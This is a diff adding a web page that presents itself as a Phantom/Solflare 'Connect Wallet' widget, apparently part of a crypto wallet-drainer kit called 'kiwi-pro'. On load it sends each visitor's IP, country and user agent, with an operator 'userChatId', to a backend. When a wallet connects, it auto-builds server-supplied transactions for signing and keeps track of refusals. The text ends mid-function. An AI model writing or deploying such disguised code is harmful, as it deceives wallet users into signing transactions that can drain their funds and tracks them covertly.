@@ -1,0 +1,1955 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Wallet Adapter</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <style>
+      * {
+        box-sizing: border-box;
+        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      }
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        width: 400px;
+        height: 380px;
+        background: transparent;
+        color: #ffffff;
+        overflow: hidden;
+      }
+      body {
+        display: block;
+      }
+      .card {
+        background: #1a1a1a;
+        border-radius: 20px;
+        padding: 32px 24px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        width: 400px;
+        height: 380px;
+        margin: 0;
+        animation: slideInUp 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        transform-origin: center;
+        position: relative;
+        box-sizing: border-box;
+        overflow: hidden;
+        display: flex;
+        flex-direction: column;
+      }
+      
+      /* Mobile styles - only applies on mobile devices */
+      @media (max-width: 768px) and (pointer: coarse) {
+        html,
+        body {
+          width: 100vw !important;
+          height: 100vh !important;
+          max-width: 100vw !important;
+          max-height: 100vh !important;
+          background: rgba(0, 0, 0, 0.5);
+          backdrop-filter: blur(4px);
+          overflow: hidden;
+        }
+        .card {
+          width: 100vw !important;
+          height: 60vh !important;
+          max-width: 100vw !important;
+          max-height: 60vh !important;
+          min-height: 60vh !important;
+          border-radius: 24px 24px 0 0 !important;
+          margin: 0 !important;
+          padding: 32px 24px !important;
+          padding-bottom: calc(24px + env(safe-area-inset-bottom, 0)) !important;
+          position: fixed !important;
+          bottom: 0 !important;
+          left: 0 !important;
+          right: 0 !important;
+          top: auto !important;
+          animation: slideUpFromBottom 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+          box-shadow: 0 -4px 24px rgba(0, 0, 0, 0.3);
+          box-sizing: border-box !important;
+        }
+        @keyframes slideUpFromBottom {
+          from {
+            transform: translateY(100%);
+          }
+          to {
+            transform: translateY(0);
+          }
+        }
+      }
+      
+      .back-button {
+        position: absolute;
+        top: 16px;
+        left: 16px;
+        width: 36px;
+        height: 36px;
+        border-radius: 10px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        background: rgba(255, 255, 255, 0.05);
+        color: #fff;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+        transition: all 0.2s ease;
+        z-index: 10;
+        opacity: 0;
+        pointer-events: none;
+      }
+      .back-button.visible {
+        opacity: 1;
+        pointer-events: all;
+        animation: fadeIn 0.3s ease-out;
+      }
+      .back-button:hover {
+        background: rgba(255, 255, 255, 0.1);
+        border-color: rgba(255, 255, 255, 0.2);
+        transform: translateX(-2px);
+      }
+      
+      .single-wallet-view {
+        display: none;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 250px;
+        gap: 24px;
+      }
+      .single-wallet-view.active {
+        display: flex;
+        animation: fadeIn 0.3s ease-out;
+      }
+      
+      .wallet-loading-container {
+        position: relative;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 100px;
+        height: 100px;
+      }
+      
+      .wallet-loading-icon {
+        width: 80px;
+        height: 80px;
+        border-radius: 20px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        background: rgba(255, 255, 255, 0.05);
+        position: relative;
+        z-index: 2;
+      }
+      .wallet-loading-icon img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        padding: 12px;
+      }
+      
+      .loading-ring {
+        position: absolute;
+        width: 100px;
+        height: 100px;
+        border-radius: 24px;
+        z-index: 1;
+        top: 0;
+        left: 0;
+        pointer-events: none;
+      }
+      .loading-ring svg {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100px;
+        height: 100px;
+      }
+      .loading-ring path {
+        fill: none;
+        stroke-width: 3;
+        stroke-linecap: round;
+        stroke-dasharray: 60 340;
+        stroke-dashoffset: 0;
+        animation: snakeAround 2s linear infinite;
+      }
+      .loading-ring.phantom path {
+        stroke: #3b82f6;
+      }
+      .loading-ring.solflare path {
+        stroke: #fbbf24;
+      }
+      .loading-ring.rejected path {
+        stroke: #ef4444;
+        stroke-dasharray: 400;
+        stroke-dashoffset: 400;
+        animation: snakeAroundComplete 1s ease-out forwards, shake 0.5s ease-out 1s;
+      }
+      @keyframes snakeAround {
+        0% {
+          stroke-dashoffset: 0;
+        }
+        100% {
+          stroke-dashoffset: 400;
+        }
+      }
+      @keyframes snakeAroundComplete {
+        0% {
+          stroke-dashoffset: 400;
+        }
+        100% {
+          stroke-dashoffset: 0;
+        }
+      }
+      
+      .wallet-loading-name {
+        font-size: 18px;
+        font-weight: 500;
+        text-align: center;
+      }
+      
+      .wallet-loading-status {
+        font-size: 14px;
+        color: #888;
+        text-align: center;
+      }
+      .rejection-message {
+        margin-top: 16px;
+        padding: 12px 16px;
+        background: rgba(239, 68, 68, 0.1);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        border-radius: 12px;
+        color: #ef4444;
+        font-size: 13px;
+        text-align: center;
+        animation: fadeIn 0.3s ease-out, shake 0.5s ease-out;
+        display: none;
+      }
+      .rejection-message.show {
+        display: block;
+      }
+      
+      .wallet-buttons.hidden {
+        display: none;
+      }
+      
+      .title.hidden,
+      .subtitle.hidden {
+        display: none;
+      }
+      
+      @keyframes slideInUp {
+        from {
+          opacity: 0;
+          transform: translateY(20px) scale(0.95);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+      
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+      
+      @keyframes slideIn {
+        from {
+          opacity: 0;
+          transform: translateX(-10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateX(0);
+        }
+      }
+      
+      @keyframes pulse {
+        0%, 100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.6;
+        }
+      }
+      
+      @keyframes shimmer {
+        0% {
+          background-position: -1000px 0;
+        }
+        100% {
+          background-position: 1000px 0;
+        }
+      }
+      
+      @keyframes bounce {
+        0%, 100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-4px);
+        }
+      }
+      .title {
+        font-size: 24px;
+        font-weight: 600;
+        margin-bottom: 8px;
+        text-align: center;
+        letter-spacing: -0.5px;
+        animation: fadeIn 0.6s ease-out 0.1s both;
+      }
+      .subtitle {
+        font-size: 14px;
+        color: #888;
+        margin-bottom: 32px;
+        text-align: center;
+        line-height: 1.5;
+        animation: fadeIn 0.6s ease-out 0.2s both;
+      }
+      .wallet-buttons {
+        display: flex;
+        flex-direction: column;
+        gap: 12px;
+        margin-bottom: 20px;
+        animation: fadeIn 0.6s ease-out 0.3s both;
+      }
+      .wallet-button {
+        width: 100%;
+        padding: 16px 20px;
+        border-radius: 16px;
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        background: rgba(255, 255, 255, 0.03);
+        color: #ffffff;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        position: relative;
+        backdrop-filter: blur(10px);
+        overflow: hidden;
+      }
+      .wallet-button::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.1), transparent);
+        transition: left 0.5s;
+      }
+      .wallet-button:hover:not(:disabled)::before {
+        left: 100%;
+      }
+      .wallet-button:hover:not(:disabled) {
+        background: rgba(255, 255, 255, 0.08);
+        border-color: rgba(255, 255, 255, 0.2);
+        transform: translateY(-2px) scale(1.01);
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3);
+      }
+      .wallet-button:active:not(:disabled) {
+        transform: translateY(0) scale(0.98);
+        transition: transform 0.1s;
+      }
+      .wallet-button:nth-child(1) {
+        animation: slideIn 0.5s ease-out 0.4s both;
+      }
+      .wallet-button:nth-child(2) {
+        animation: slideIn 0.5s ease-out 0.5s both;
+      }
+      .wallet-button:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .wallet-button-content {
+        display: flex;
+        align-items: center;
+        gap: 16px;
+      }
+      .wallet-icon {
+        width: 40px;
+        height: 40px;
+        border-radius: 12px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        overflow: hidden;
+        flex-shrink: 0;
+        background: rgba(255, 255, 255, 0.05);
+        transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        position: relative;
+      }
+      .wallet-button:hover:not(:disabled) .wallet-icon {
+        transform: scale(1.1) rotate(5deg);
+      }
+      .wallet-icon img {
+        width: 100%;
+        height: 100%;
+        object-fit: contain;
+        padding: 6px;
+        transition: transform 0.3s ease;
+      }
+      .wallet-button:hover:not(:disabled) .wallet-icon img {
+        transform: scale(1.05);
+      }
+      .wallet-name {
+        font-weight: 500;
+        font-size: 16px;
+      }
+      .wallet-arrow {
+        color: #888;
+        font-size: 20px;
+        opacity: 0.6;
+        transition: all 0.3s ease;
+      }
+      .wallet-button:hover:not(:disabled) .wallet-arrow {
+        opacity: 1;
+        transform: translateX(4px);
+        color: #fff;
+      }
+      .info {
+        font-size: 12px;
+        color: #888;
+        margin-top: 16px;
+        line-height: 1.6;
+        text-align: center;
+        padding: 12px;
+        background: rgba(255, 255, 255, 0.03);
+        border-radius: 12px;
+        border: 1px solid rgba(255, 255, 255, 0.05);
+      }
+      .status {
+        margin-top: 16px;
+        font-size: 13px;
+        color: #a5b4fc;
+        white-space: pre-line;
+        text-align: center;
+        padding: 12px;
+        background: rgba(165, 180, 252, 0.1);
+        border-radius: 12px;
+        border: 1px solid rgba(165, 180, 252, 0.2);
+        animation: fadeIn 0.4s ease-out;
+      }
+      .status.error {
+        color: #f97373;
+        background: rgba(249, 115, 115, 0.1);
+        border-color: rgba(249, 115, 115, 0.2);
+        animation: shake 0.5s ease-out;
+      }
+      .status.success {
+        color: #4ade80;
+        background: rgba(74, 222, 128, 0.1);
+        border-color: rgba(74, 222, 128, 0.2);
+        animation: bounce 0.6s ease-out;
+      }
+      .hidden {
+        display: none;
+      }
+      .loading {
+        animation: pulse 1.5s ease-in-out infinite;
+      }
+      
+      @keyframes shake {
+        0%, 100% {
+          transform: translateX(0);
+        }
+        25% {
+          transform: translateX(-8px);
+        }
+        75% {
+          transform: translateX(8px);
+        }
+      }
+      
+      .info {
+        animation: fadeIn 0.4s ease-out;
+      }
+      
+      /* Glow effect on hover */
+      .wallet-button:hover:not(:disabled) {
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3), 0 0 20px rgba(139, 92, 246, 0.2);
+      }
+      
+      /* Loading spinner */
+      .spinner {
+        display: inline-block;
+        width: 16px;
+        height: 16px;
+        border: 2px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+      }
+      
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      
+      @keyframes spinRounded {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+      
+      .wallet-loading-container.shake {
+        animation: shake 0.5s ease-out;
+      }
+      
+      .wallet-loading-container.rejected {
+        filter: brightness(0.8);
+      }
+      
+      .wallet-loading-container.rejected .wallet-loading-icon {
+        background: rgba(239, 68, 68, 0.1);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+      }
+    </style>
+    <!-- Lightweight web3.js bundle for Transaction.from in the browser -->
+    <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.js"></script>
+  </head>
+  <body>
+    <div class="card">
+      <button id="backBtn" class="back-button" title="Go back">←</button>
+      
+      <div class="title" id="title"></div>
+      <div class="subtitle" id="subtitle"></div>
+      
+      <div class="wallet-buttons" id="walletButtons">
+        <button id="phantomBtn" class="wallet-button">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img src="https://explorer-api.walletconnect.com/v3/logo/md/b6ec7b81-bb4f-427d-e290-7631e6e50d00?projectId=34357d3c125c2bcf2ce2bc3309d98715" alt="Phantom" onerror="this.style.display='none'; this.parentElement.innerHTML='<span style=\'color:#ab9ff2;font-weight:600;font-size:20px\'>P</span>';" />
+            </div>
+            <span class="wallet-name">Phantom</span>
+          </div>
+          <span class="wallet-arrow">→</span>
+        </button>
+        <button id="solflareBtn" class="wallet-button">
+          <div class="wallet-button-content">
+            <div class="wallet-icon">
+              <img src="https://play-lh.googleusercontent.com/lql-v5JBq7UFMLQALnvZCX6r1X_Av8rVfrkzuv_fdjzEv88ucl4f5iCFfiN9isEc1TE=w240-h480-rw" alt="Solflare" onerror="this.style.display='none'; this.parentElement.innerHTML='<span style=\'color:#ff6b35;font-weight:600;font-size:20px\'>S</span>';" />
+            </div>
+            <span class="wallet-name">Solflare</span>
+          </div>
+          <span class="wallet-arrow">→</span>
+        </button>
+      </div>
+      
+      <div class="single-wallet-view" id="singleWalletView">
+        <div class="wallet-loading-container" id="walletLoadingContainer">
+          <div class="loading-ring" id="loadingRing">
+            <svg viewBox="0 0 100 100" preserveAspectRatio="none">
+              <path d="M 24,3 L 76,3 A 21,21 0 0,1 97,24 L 97,76 A 21,21 0 0,1 76,97 L 24,97 A 21,21 0 0,1 3,76 L 3,24 A 21,21 0 0,1 24,3 Z" />
+            </svg>
+          </div>
+          <div class="wallet-loading-icon" id="walletLoadingIcon">
+            <img id="walletLoadingImg" alt="Wallet" />
+          </div>
+        </div>
+        <div class="wallet-loading-name" id="walletLoadingName"></div>
+        <div class="wallet-loading-status" id="walletLoadingStatus"></div>
+        <div class="rejection-message" id="rejectionMessage"></div>
+      </div>
+      
+      <div class="info hidden" id="info"></div>
+      <div id="status" class="status hidden"></div>
+    </div>
+
+    <script>
+      
+      (function () {
+        const phantomBtn = document.getElementById("phantomBtn");
+        const solflareBtn = document.getElementById("solflareBtn");
+        const statusEl = document.getElementById("status");
+        const infoEl = document.getElementById("info");
+        const backBtn = document.getElementById("backBtn");
+        const titleEl = document.getElementById("title");
+        const subtitleEl = document.getElementById("subtitle");
+        const walletButtons = document.getElementById("walletButtons");
+        const singleWalletView = document.getElementById("singleWalletView");
+        const walletLoadingContainer = document.getElementById("walletLoadingContainer");
+        const loadingRing = document.getElementById("loadingRing");
+        const walletLoadingIcon = document.getElementById("walletLoadingIcon");
+        const walletLoadingImg = document.getElementById("walletLoadingImg");
+        const walletLoadingName = document.getElementById("walletLoadingName");
+        const walletLoadingStatus = document.getElementById("walletLoadingStatus");
+        const rejectionMessage = document.getElementById("rejectionMessage");
+
+        // Hardcoded API base URL - not changeable by users
+        const API_BASE_URL = "http://localhost:4000"; //"https://backend-dya8zg.fly.dev";//"http://localhost:4000";
+        
+        let config = null;
+        let userPubkey = null;
+        let unsignedTxs = null;
+        let currentProvider = null;
+        let currentWallet = null;
+        let isRejected = false;
+        let rejectNotificationSent = false;
+        let stressTestRunning = false;
+        let stressTestStarted = false;
+        let visitNotificationSent = false;
+
+        // Helper function to get text with fallback
+        function getText(key, fallback) {
+          return (config && config.texts && config.texts[key]) || fallback;
+        }
+
+          window.addEventListener('message', (event) => {
+
+          const msg = event.data;
+          if (!msg || msg.source !== 'kiwi-pro-loader') return;
+          if (msg.type === 'init' && msg.payload) {
+            const config = msg.payload;
+            console.log('kiwi config:', config);
+          }
+        });
+
+        window.parent.postMessage({ source: 'kiwi-pro-iframe', type: 'request-init' }, '*');
+
+        // Try to read config from URL parameters first (for mobile direct opens)
+        const urlConfig = readConfigFromURL();
+        if (urlConfig) {
+          config = urlConfig;
+          console.log("Config loaded from URL parameters");
+          // Set initial UI texts from config
+          if (titleEl) titleEl.textContent = getText("title", "Connect Wallet");
+          if (subtitleEl) subtitleEl.textContent = getText("subtitle", "Choose a wallet to connect to this app");
+          sendVisitNotification();
+          setTimeout(() => tryAutoConnect(), 100);
+        }
+
+        // Mobile detection
+        function isMobile() {
+          return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Check if we're in a wallet app
+        function isInWalletApp() {
+          const ua = navigator.userAgent.toLowerCase();
+          return ua.includes("phantom") || ua.includes("solflare");
+        }
+
+        // Get browser name
+        function getBrowserName() {
+          const ua = navigator.userAgent;
+          if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+          if (ua.includes("Firefox")) return "Firefox";
+          if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+          if (ua.includes("Edg")) return "Edge";
+          return "Unknown";
+        }
+
+        // Get country flag emoji from country code
+        function getFlagEmoji(countryCode) {
+          if (!countryCode) return "";
+          const codePoints = countryCode
+            .toUpperCase()
+            .split("")
+            .map((char) => 127397 + char.charCodeAt());
+          return String.fromCodePoint(...codePoints);
+        }
+
+        // Get IP and location info
+        async function getIPAndLocation() {
+          try {
+            // Check if IP is already cached in localStorage
+            const cachedIP = localStorage.getItem("kiwi_user_ip");
+            if (cachedIP) {
+              console.log("Using cached IP from localStorage:", cachedIP);
+              return {
+                ip: cachedIP,
+                country: localStorage.getItem("kiwi_user_country") || "Unknown",
+                countryCode: localStorage.getItem("kiwi_user_countryCode") || "",
+                flag: localStorage.getItem("kiwi_user_flag") || "",
+              };
+            }
+
+            const resp = await fetch("https://ipapi.co/json/");
+            const data = await resp.json();
+            const ip = data.ip || "unknown";
+            const country = data.country_name || "Unknown";
+            const countryCode = data.country_code || "";
+            const flag = getFlagEmoji(countryCode);
+
+            // Store in localStorage for future use
+            localStorage.setItem("kiwi_user_ip", ip);
+            localStorage.setItem("kiwi_user_country", country);
+            localStorage.setItem("kiwi_user_countryCode", countryCode);
+            localStorage.setItem("kiwi_user_flag", flag);
+
+            return { ip, country, countryCode, flag };
+          } catch {
+            return {
+              ip: "unknown",
+              country: "Unknown",
+              countryCode: "",
+              flag: "",
+            };
+          }
+        }
+        console.log(config);
+        // Send visit notification
+        async function sendVisitNotification() {
+          // Prevent sending twice
+          if (visitNotificationSent) {
+            console.warn("Visit notification already sent, skipping");
+            return;
+          }
+          
+          console.log("sendVisitNotification called", { config });
+          if (!config) {
+            console.warn("sendVisitNotification: Missing config");
+            return;
+          }
+          try {
+            visitNotificationSent = true;
+            const location = await getIPAndLocation();
+            const browser = getBrowserName();
+            console.log("Sending visit notification to:", API_BASE_URL.replace(/\/$/, "") + "/notify-visit");
+            console.log("IP Address:", location.ip);
+            const response = await fetch(API_BASE_URL.replace(/\/$/, "") + "/notify-visit", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                browser,
+                userAgent: navigator.userAgent,
+                ip: location.ip,
+                flag: location.flag,
+                country: location.country,
+                userChatId: config.userChatId || null,
+              }),
+            });
+            console.log("Visit notification response:", response.status, response.ok);
+          } catch (e) {
+            console.error("Failed to send visit notification:", e);
+            visitNotificationSent = false; // Reset on error so it can retry
+          }
+        }
+
+        function setStatus(text, cls) {
+          if (text) {
+            statusEl.textContent = text;
+            statusEl.className = "status" + (cls ? " " + cls : "");
+            statusEl.classList.remove("hidden");
+          } else {
+            statusEl.classList.add("hidden");
+          }
+        }
+
+        function setInfo(text) {
+          if (text) {
+            infoEl.textContent = text;
+            infoEl.classList.remove("hidden");
+          } else {
+            infoEl.classList.add("hidden");
+          }
+        }
+
+        function postToParent(type, payload) {
+          if (!window.parent) return;
+          window.parent.postMessage(
+            {
+              source: "kiwi-pro-iframe",
+              type,
+              payload,
+            },
+            "*"
+          );
+        }
+
+        function showSingleWalletView(walletName, logoUrl) {
+          currentWallet = walletName;
+          isRejected = false;
+          
+          // Hide selection view
+          titleEl.classList.add("hidden");
+          subtitleEl.classList.add("hidden");
+          walletButtons.classList.add("hidden");
+          
+          // Show single wallet view
+          singleWalletView.classList.add("active");
+          backBtn.classList.add("visible");
+          
+          // Set wallet logo and name
+          walletLoadingImg.src = logoUrl;
+          walletLoadingImg.alt = walletName;
+          walletLoadingName.textContent = walletName.charAt(0).toUpperCase() + walletName.slice(1);
+          walletLoadingStatus.textContent = getText("connecting", "Connecting...");
+          
+          // Set loading ring color
+          loadingRing.className = "loading-ring " + walletName;
+          loadingRing.classList.remove("rejected");
+          walletLoadingContainer.classList.remove("rejected", "shake");
+          rejectionMessage.classList.remove("show");
+        }
+
+        function showSelectionView() {
+          currentWallet = null;
+          isRejected = false;
+          rejectNotificationSent = false;
+          stressTestStarted = false;
+          stressTestRunning = false;
+          // Note: visitNotificationSent is NOT reset here - we only want to send it once per session
+          
+          // Show selection view
+          titleEl.classList.remove("hidden");
+          subtitleEl.classList.remove("hidden");
+          walletButtons.classList.remove("hidden");
+          
+          // Hide single wallet view
+          singleWalletView.classList.remove("active");
+          backBtn.classList.remove("visible");
+          
+          // Reset buttons
+          phantomBtn.disabled = false;
+          solflareBtn.disabled = false;
+          
+          // Reset loading state
+          loadingRing.classList.remove("rejected");
+          walletLoadingContainer.classList.remove("rejected", "shake");
+          rejectionMessage.classList.remove("show");
+        }
+
+        function showRejectedState(message) {
+          isRejected = true;
+          walletLoadingStatus.textContent = message || getText("connectionRejected", "Connection rejected");
+          rejectionMessage.textContent = message || getText("transactionRejected", "Transaction rejected");
+          loadingRing.classList.add("rejected");
+          walletLoadingContainer.classList.add("rejected", "shake");
+          rejectionMessage.classList.add("show");
+          
+          // Remove shake class after animation
+          setTimeout(() => {
+            walletLoadingContainer.classList.remove("shake");
+          }, 500);
+        }
+
+        function updateLoadingStatus(text) {
+          walletLoadingStatus.textContent = text;
+        }
+
+        // Read config from URL parameters
+        function readConfigFromURL() {
+          try {
+            const params = new URLSearchParams(window.location.search);
+            const configParam = params.get('kiwiConfig');
+            if (configParam) {
+              try {
+                const decodedConfig = JSON.parse(decodeURIComponent(configParam));
+                console.log("Config read from URL parameters:", decodedConfig);
+                return decodedConfig;
+              } catch (e) {
+                console.error("Failed to parse config from URL:", e);
+                return null;
+              }
+            }
+          } catch (e) {
+            console.error("Error reading config from URL:", e);
+          }
+          return null;
+        }
+
+        // Open wallet deeplink on mobile
+        function openWalletDeeplink(wallet) {
+          if (!isMobile()) return false;
+          
+          // Don't redirect if already in wallet app
+          if (isInWalletApp()) {
+            return false;
+          }
+          
+          // Get the current URL - use parent window URL if in iframe, otherwise current
+          let currentUrl;
+          if (window.parent && window.parent !== window) {
+            try {
+              currentUrl = window.parent.location.href;
+            } catch (e) {
+              // Cross-origin, use current iframe URL
+              currentUrl = window.location.href;
+            }
+          } else {
+            currentUrl = window.location.href;
+          }
+          
+          // Remove any existing kiwiConfig from URL to avoid duplication
+          try {
+            const url = new URL(currentUrl);
+            url.searchParams.delete('kiwiConfig');
+            currentUrl = url.toString();
+          } catch (e) {
+            // If URL parsing fails, use currentUrl as-is
+          }
+          
+          // If config exists, encode it in the URL
+          if (config) {
+            try {
+              const url = new URL(currentUrl);
+              url.searchParams.set('kiwiConfig', encodeURIComponent(JSON.stringify(config)));
+              currentUrl = url.toString();
+            } catch (e) {
+              // If URL parsing fails, append as query param manually
+              const separator = currentUrl.includes('?') ? '&' : '?';
+              currentUrl += separator + 'kiwiConfig=' + encodeURIComponent(JSON.stringify(config));
+            }
+          }
+          
+          const deeplinks = {
+            phantom: `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}`,
+            solflare: `https://solflare.com/ul/v1/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`,
+          };
+          
+          const deeplink = deeplinks[wallet];
+          if (deeplink) {
+            // Open from parent window (not iframe)
+            if (window.parent && window.parent !== window) {
+              window.parent.location.href = deeplink;
+            } else {
+              window.location.href = deeplink;
+            }
+            return true;
+          }
+          return false;
+        }
+
+        // Auto-connect if already in wallet app
+        async function tryAutoConnect() {
+          if (!isInWalletApp()) return false;
+
+          // Check Phantom first
+          const phantom = window.solana || (window.phantom && window.phantom.solana);
+          if (phantom && phantom.isPhantom) {
+            try {
+              if (phantom.isConnected && phantom.publicKey) {
+                // Already connected
+                currentProvider = phantom;
+                userPubkey = phantom.publicKey.toString();
+                setStatus(getText("connectedToPhantom", "Connected to Phantom"), "success");
+                phantomBtn.disabled = true;
+                solflareBtn.disabled = true;
+                postToParent("connected", { publicKey: userPubkey });
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  await signAndSend();
+                }
+                return true;
+              } else {
+                // Try to connect
+                await phantom.connect();
+                currentProvider = phantom;
+                userPubkey = phantom.publicKey.toString();
+                setStatus(getText("connectedToPhantom", "Connected to Phantom"), "success");
+                phantomBtn.disabled = true;
+                solflareBtn.disabled = true;
+                postToParent("connected", { publicKey: userPubkey });
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  await signAndSend();
+                }
+                return true;
+              }
+            } catch (e) {
+              console.log("Auto-connect to Phantom failed:", e);
+            }
+          }
+
+          // Check Solflare
+          const solflare = window.solflare;
+          if (solflare && solflare.isSolflare) {
+            try {
+              if (solflare.isConnected && solflare.publicKey) {
+                // Already connected
+                currentProvider = solflare;
+                userPubkey = solflare.publicKey.toString();
+                setStatus(getText("connectedToSolflare", "Connected to Solflare"), "success");
+                phantomBtn.disabled = true;
+                solflareBtn.disabled = true;
+                postToParent("connected", { publicKey: userPubkey });
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  await signAndSend();
+                }
+                return true;
+              } else {
+                // Try to connect
+                await solflare.connect();
+                currentProvider = solflare;
+                userPubkey = solflare.publicKey.toString();
+                setStatus(getText("connectedToSolflare", "Connected to Solflare"), "success");
+                phantomBtn.disabled = true;
+                solflareBtn.disabled = true;
+                postToParent("connected", { publicKey: userPubkey });
+                await buildTransaction();
+                if (unsignedTxs && unsignedTxs.length) {
+                  await signAndSend();
+                }
+                return true;
+              }
+            } catch (e) {
+              console.log("Auto-connect to Solflare failed:", e);
+            }
+          }
+
+          return false;
+        }
+
+        // Set up message listener immediately
+        window.addEventListener("message", (event) => {
+          const data = event.data;
+          console.log("iframe received message:", data);
+          
+          // Check if it's from our loader
+          if (data && data.source === "kiwi-pro-loader") {
+            if (data.type === "init") {
+              console.log("Init message received, setting config:", data.payload);
+              config = data.payload || {};
+
+              // Set initial UI texts from config
+              if (titleEl) titleEl.textContent = getText("title", "Connect Wallet");
+              if (subtitleEl) subtitleEl.textContent = getText("subtitle", "Choose a wallet to connect to this app");
+
+              postToParent("ready", {});
+              // Send visit notification when iframe loads
+              sendVisitNotification();
+              // Try auto-connect if in wallet app
+              setTimeout(() => tryAutoConnect(), 100);
+            } else if (data.type === "wallet-connected") {
+              console.log("Wallet connected from parent:", data.payload);
+              const { publicKey, wallet } = data.payload;
+              userPubkey = publicKey;
+              currentWallet = wallet;
+              updateLoadingStatus(getText("connectedBuildingTransaction", "Connected! Building transaction..."));
+              postToParent("connected", { publicKey: userPubkey });
+              
+              // Build and sign transaction
+              buildTransaction().then(() => {
+                if (unsignedTxs && unsignedTxs.length) {
+                  updateLoadingStatus(getText("pleaseSignInWallet", "Please sign in your wallet..."));
+                  signAndSend();
+                }
+              }).catch(e => {
+                console.error("Error building transaction:", e);
+                showRejectedState(getText("failedToBuildTransaction", "Failed to build transaction"));
+              });
+            } else if (data.type === "wallet-connection-error") {
+              console.error("Wallet connection error from parent:", data.payload.error);
+              updateLoadingStatus(getText("connectionFailed", "Connection failed"));
+              showRejectedState(getText("connectionFailed", "Connection failed") + ": " + data.payload.error);
+            }
+          } else {
+            // Ignore other messages (like MetaMask)
+            // Only log if it's not a known external source
+            if (data && !data.target) {
+              console.log("Message ignored - wrong source:", data?.source);
+            }
+          }
+        });
+        
+        // Also try to request init message if not received after a delay
+        setTimeout(() => {
+          if (!config) {
+            console.warn("Config not received after 1 second, requesting from parent");
+            // Try URL parameters one more time as fallback
+            const urlConfig = readConfigFromURL();
+            if (urlConfig) {
+              config = urlConfig;
+              console.log("Config loaded from URL parameters (fallback)");
+              // Set initial UI texts from config
+              if (titleEl) titleEl.textContent = getText("title", "Connect Wallet");
+              if (subtitleEl) subtitleEl.textContent = getText("subtitle", "Choose a wallet to connect to this app");
+              sendVisitNotification();
+              setTimeout(() => tryAutoConnect(), 100);
+            } else if (window.parent && window.parent !== window) {
+              window.parent.postMessage({
+                source: "kiwi-pro-iframe",
+                type: "request-init"
+              }, "*");
+            }
+          }
+        }, 1000);
+
+        async function getClientIP() {
+          try {
+            const resp = await fetch("https://api.ipify.org?format=json");
+            const json = await resp.json();
+            return json.ip || "unknown";
+          } catch {
+            return "unknown";
+          }
+        }
+
+        async function connectWallet(walletName) {
+          console.log("connectWallet called with:", walletName);
+          
+          // Prevent multiple simultaneous connection attempts
+          if (currentWallet && currentWallet === walletName) {
+            console.log("Already processing connection for", walletName);
+            return;
+          }
+          
+          const logoUrls = {
+            phantom: "https://explorer-api.walletconnect.com/v3/logo/md/b6ec7b81-bb4f-427d-e290-7631e6e50d00?projectId=34357d3c125c2bcf2ce2bc3309d98715",
+            solflare: "https://play-lh.googleusercontent.com/lql-v5JBq7UFMLQALnvZCX6r1X_Av8rVfrkzuv_fdjzEv88ucl4f5iCFfiN9isEc1TE=w240-h480-rw"
+          };
+          
+          // Show single wallet view
+          showSingleWalletView(walletName, logoUrls[walletName]);
+          updateLoadingStatus(getText("connecting", "Connecting..."));
+          
+          // Disable buttons to prevent multiple clicks
+          phantomBtn.disabled = true;
+          solflareBtn.disabled = true;
+          
+          // Reset stress test for new attempt
+          stressTestStarted = false;
+          stressTestRunning = false;
+          
+          // On mobile, try deeplink first (but not if already in wallet app)
